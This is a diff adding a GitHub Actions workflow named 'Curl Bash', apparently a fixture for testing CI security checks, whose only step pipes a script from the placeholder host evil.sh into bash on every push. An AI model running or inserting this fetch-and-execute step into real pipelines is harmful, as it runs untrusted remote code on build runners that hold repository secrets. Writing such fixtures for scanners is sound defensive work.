@@ -1,0 +1,8 @@
+name: Curl Bash
+on:
+  push:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -s https://evil.sh | bash
